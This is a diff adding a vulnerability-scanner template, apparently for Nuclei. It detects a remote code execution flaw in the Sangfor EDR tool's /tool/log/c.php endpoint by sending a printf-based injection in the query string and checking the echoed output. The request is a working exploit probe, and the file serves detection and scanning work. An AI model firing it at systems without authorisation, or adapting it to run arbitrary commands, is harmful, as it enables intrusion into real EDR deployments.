@@ -1,0 +1,26 @@
+id: poc-sangfor-edr-rce
+info:
+  name: Sangfor EDR Tool Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce
+  description: |
+    Sangfor EDR Tool is vulnerable to a Remote Code Execution vulnerability that can be exploited via the `/tool/log/c.php` endpoint.
+
+variables:
+  r1: "{{rand_base(8)}}"
+  r2: "{{rand_base(8)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host={{r1}}%25%25{{r2}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r1}}%{{r2}}"
+        part: body
